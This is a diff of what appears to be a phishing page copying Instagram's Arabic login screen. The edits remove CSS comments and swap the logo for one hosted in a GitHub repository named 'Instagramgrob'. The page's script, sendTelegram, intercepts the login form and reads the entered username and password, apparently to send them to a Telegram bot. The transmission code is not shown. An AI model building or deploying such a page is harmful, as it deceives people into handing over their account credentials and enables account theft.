@@ -13,20 +13,20 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            direction: rtl; /* اتجاه النصوص من اليمين لليسار */
+            direction: rtl; 
         }
         .login-container {
             background-color: #fff;
             border: 1px solid #dbdbdb;
             padding: 20px;
-            width: 90%; /* تقليل العرض ليكون مناسبًا للشاشات الصغيرة */
-            max-width: 360px; /* تحديد عرض أقصى يناسب الهواتف */
+            width: 90%; 
+            max-width: 360px; 
             text-align: center;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
         }
         .login-container img {
-            width: 150px; /* تقليل حجم الشعار ليتناسب مع الهواتف */
+            width: 150px; 
             margin-bottom: 20px;
         }
         input[type="text"], input[type="password"] {
@@ -36,16 +36,16 @@
             border: 1px solid #dbdbdb;
             border-radius: 5px;
             font-size: 16px;
-            text-align: right; /* محاذاة النصوص لليمين */
+            text-align: right; 
         }
         .login-options {
-            margin: 10px 0; /* المسافة بين الحقول */
-            text-align: center; /* محاذاة النصوص في الوسط */
+            margin: 10px 0; 
+            text-align: center; 
         }
         .login-options a {
             color: #3897f0;
             text-decoration: none;
-            font-size: 16px; /* تكبير حجم النص */
+            font-size: 16px; 
         }
         button {
             width: 100%;
@@ -56,7 +56,7 @@
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
-            margin-top: 10px; /* المسافة بين الحقول وزر "تسجيل الدخول" */
+            margin-top: 10px; 
         }
         button:hover {
             background-color: #318ce7;
@@ -68,7 +68,7 @@
             margin-top: 10px;
         }
         .footer {
-            margin-top: 30px; /* زيادة المسافة بين النصوص الأخرى و"أليس لديك حساب؟" */
+            margin-top: 30px; 
             font-size: 14px;
             color: #8e8e8e;
         }
@@ -81,7 +81,7 @@
 <body>
 
 <div class="login-container">
-    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
+    <img src="https://github.com/9wps/Instagramgrob/blob/main/inst.png" alt="Instagram Logo">
     <button class="facebook-login">متابعة بحساب فيسبوك</button>
     <div class="login-options">أو</div>
     <form id="loginForm" method="POST">
@@ -101,7 +101,7 @@
 
 <script>
     function sendTelegram(event) {
-        event.preventDefault();  // منع إرسال النموذج افتراضيًا
+        event.preventDefault();  //
 
         var username = document.getElementById('username').value;
         var password = document.getElementById('password').value;
